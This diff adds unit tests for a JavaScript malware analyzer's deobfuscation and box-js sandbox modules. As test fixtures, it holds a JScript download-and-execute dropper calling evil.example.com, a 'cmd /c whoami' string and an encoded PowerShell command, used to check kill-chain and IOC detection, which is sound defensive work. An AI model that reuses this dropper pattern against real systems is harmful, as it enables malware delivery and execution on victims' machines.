@@ -653,3 +653,178 @@ class TestMITREMapping:
         techniques = mitre_attack_techniques(_MITREMockStruct(), analyzer)
         ids = [t["id"] for t in techniques]
         assert "T1027" in ids
+
+
+# ===================================================================
+# REMnux tool integration (deobfuscate + dynamic modules)
+# ===================================================================
+
+
+from unittest import mock
+
+
+class TestDeobfuscateModule:
+    def _make_struct(self, data, filename="test.js", mime_type="application/javascript"):
+        from structure import Structure
+        Structure.clear_cache()
+        return Structure.create(data=data, filename=filename, mime_type=mime_type)
+
+    def test_skips_when_no_tools_available(self):
+        """Deobfuscate module should be a no-op when neither tool is installed."""
+        source = b'eval("obfuscated code");'
+        with mock.patch("Utils.js_tools.jstillery_available", return_value=False), \
+             mock.patch("Utils.js_tools.de4js_available", return_value=False):
+            s = self._make_struct(source)
+        assert "deobfuscated" not in s.analyzer.reports
+
+    def test_jstillery_produces_report(self):
+        """When JStillery produces output, a deobfuscated report should appear."""
+        source = b'eval("obfuscated code");'
+        deobfuscated = 'var x = "hello";'
+        with mock.patch("Utils.js_tools.jstillery_available", return_value=True), \
+             mock.patch("Utils.js_tools.run_jstillery", return_value=deobfuscated), \
+             mock.patch("Utils.js_tools.de4js_available", return_value=False):
+            s = self._make_struct(source)
+        assert "deobfuscated" in s.analyzer.reports
+        assert "JStillery" in s.analyzer.reports["deobfuscated"].text
+        # Deobfuscated child emitted as text/plain
+        children = s.analyzer.get_childitems()
+        deobf_children = [c for c in children if getattr(c, "filename", "") == "deobfuscated.js"]
+        assert len(deobf_children) >= 1
+
+    def test_de4js_fallback(self):
+        """de4js runs when JStillery is not available."""
+        source = b'eval("packed code");'
+        unpacked = 'alert("unpacked");'
+        with mock.patch("Utils.js_tools.jstillery_available", return_value=False), \
+             mock.patch("Utils.js_tools.de4js_available", return_value=True), \
+             mock.patch("Utils.js_tools.run_de4js", return_value=unpacked):
+            s = self._make_struct(source)
+        assert "deobfuscated" in s.analyzer.reports
+        assert "de4js" in s.analyzer.reports["deobfuscated"].text
+
+    def test_deobfuscated_source_rescanned_for_threats(self):
+        """New threat patterns found in deobfuscated source get reported."""
+        # Original source has no WScript.Shell, but deobfuscated version does
+        source = b'eval(obfuscated_blob);'
+        deobfuscated = 'var shell = new ActiveXObject("WScript.Shell"); shell.Run("cmd /c whoami");'
+        with mock.patch("Utils.js_tools.jstillery_available", return_value=True), \
+             mock.patch("Utils.js_tools.run_jstillery", return_value=deobfuscated), \
+             mock.patch("Utils.js_tools.de4js_available", return_value=False):
+            s = self._make_struct(source)
+        # Should have post-deobfuscation threat reports
+        deobf_threats = [k for k in s.analyzer.reports if k.startswith("threat_")
+                         and "[deobf]" in s.analyzer.reports[k].short]
+        assert len(deobf_threats) > 0
+
+    def test_kill_chain_detected_post_deobfuscation(self):
+        """Kill chain should be detected when deobfuscated source reveals all components."""
+        # Original has no kill chain patterns
+        source = b'eval(encoded_dropper);'
+        # Deobfuscated reveals full kill chain
+        deobfuscated = """
+        var http = new ActiveXObject("MSXML2.XMLHTTP");
+        http.Open("GET", "http://evil.example.com/payload.exe", false);
+        http.Send();
+        var stream = new ActiveXObject("ADODB.Stream");
+        stream.SaveToFile("C:\\\\temp\\\\payload.exe");
+        var shell = new ActiveXObject("WScript.Shell");
+        shell.Run("C:\\\\temp\\\\payload.exe");
+        """
+        with mock.patch("Utils.js_tools.jstillery_available", return_value=True), \
+             mock.patch("Utils.js_tools.run_jstillery", return_value=deobfuscated), \
+             mock.patch("Utils.js_tools.de4js_available", return_value=False):
+            s = self._make_struct(source)
+        assert "kill_chain" in s.analyzer.reports
+
+
+class TestDynamicModule:
+    def _make_struct(self, data, filename="test.js", mime_type="application/javascript"):
+        from structure import Structure
+        Structure.clear_cache()
+        return Structure.create(data=data, filename=filename, mime_type=mime_type)
+
+    def test_skips_when_no_boxjs(self):
+        """Dynamic module should be a no-op when box-js isn't installed."""
+        source = b'var x = new ActiveXObject("WScript.Shell");'
+        with mock.patch("Utils.js_tools.boxjs_available", return_value=False):
+            s = self._make_struct(source)
+        assert "boxjs_urls" not in s.analyzer.reports
+
+    def test_boxjs_urls_report(self):
+        """box-js URL results should produce a report."""
+        source = b'var http = new ActiveXObject("MSXML2.XMLHTTP");'
+        boxjs_result = {
+            "urls": ["http://evil.example.com/payload.exe"],
+            "active_urls": ["http://evil.example.com/payload.exe"],
+        }
+        with mock.patch("Utils.js_tools.boxjs_available", return_value=True), \
+             mock.patch("Utils.js_tools.run_boxjs", return_value=boxjs_result):
+            s = self._make_struct(source)
+        assert "boxjs_urls" in s.analyzer.reports
+        report = s.analyzer.reports["boxjs_urls"]
+        assert report.severity == 0  # CRITICAL (active URLs)
+        assert report.data["urls"] == ["http://evil.example.com/payload.exe"]
+
+    def test_boxjs_iocs_report(self):
+        """box-js IOC results should produce a report."""
+        source = b'var x = 1;'
+        boxjs_result = {
+            "ioc": ["evil.example.com", "192.168.1.1"],
+        }
+        with mock.patch("Utils.js_tools.boxjs_available", return_value=True), \
+             mock.patch("Utils.js_tools.run_boxjs", return_value=boxjs_result):
+            s = self._make_struct(source)
+        assert "boxjs_iocs" in s.analyzer.reports
+        assert s.analyzer.reports["boxjs_iocs"].data["iocs"] == ["evil.example.com", "192.168.1.1"]
+
+    def test_boxjs_payloads_become_children(self):
+        """Extracted payloads from box-js should become child structures."""
+        source = b'var x = 1;'
+        boxjs_result = {
+            "payloads": [{"filename": "dropped.exe", "data": b"MZfakepayload"}],
+        }
+        with mock.patch("Utils.js_tools.boxjs_available", return_value=True), \
+             mock.patch("Utils.js_tools.run_boxjs", return_value=boxjs_result):
+            s = self._make_struct(source)
+        children = s.analyzer.get_childitems()
+        payload_children = [c for c in children if getattr(c, "filename", "") == "dropped.exe"]
+        assert len(payload_children) >= 1
+
+    def test_boxjs_snippets_report(self):
+        """box-js snippet results should produce a report and children."""
+        source = b'var x = 1;'
+        boxjs_result = {
+            "snippets": ["cmd /c whoami", "powershell -enc dGVzdA=="],
+        }
+        with mock.patch("Utils.js_tools.boxjs_available", return_value=True), \
+             mock.patch("Utils.js_tools.run_boxjs", return_value=boxjs_result):
+            s = self._make_struct(source)
+        assert "boxjs_snippets" in s.analyzer.reports
+
+    def test_boxjs_resources_report(self):
+        """box-js resource results should produce a report."""
+        source = b'var x = 1;'
+        boxjs_result = {
+            "resources": [{"filename": "payload.exe", "type": "PE"}],
+        }
+        with mock.patch("Utils.js_tools.boxjs_available", return_value=True), \
+             mock.patch("Utils.js_tools.run_boxjs", return_value=boxjs_result):
+            s = self._make_struct(source)
+        assert "boxjs_resources" in s.analyzer.reports
+        assert s.analyzer.reports["boxjs_resources"].data["resources"] == [
+            {"filename": "payload.exe", "type": "PE"}
+        ]
+
+    def test_boxjs_urls_no_active_severity_high(self):
+        """URLs without active downloads should be HIGH, not CRITICAL."""
+        source = b'var x = 1;'
+        boxjs_result = {
+            "urls": ["http://example.com/check"],
+            "active_urls": [],
+        }
+        with mock.patch("Utils.js_tools.boxjs_available", return_value=True), \
+             mock.patch("Utils.js_tools.run_boxjs", return_value=boxjs_result):
+            s = self._make_struct(source)
+        assert "boxjs_urls" in s.analyzer.reports
+        assert s.analyzer.reports["boxjs_urls"].severity == 1  # HIGH
